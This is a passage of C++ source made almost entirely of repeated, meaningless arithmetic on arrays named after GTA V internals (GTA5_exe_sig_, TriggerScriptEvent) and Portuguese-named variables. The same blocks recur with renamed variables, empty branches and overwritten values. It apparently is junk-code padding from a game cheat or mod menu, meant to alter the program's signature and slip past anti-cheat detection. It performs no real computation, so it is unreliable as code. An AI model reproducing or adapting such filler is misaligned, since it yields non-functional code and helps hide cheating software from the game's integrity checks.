				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<?xml version=\"1.0\" encoding=\"ISO - 8859 - 1\"?>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
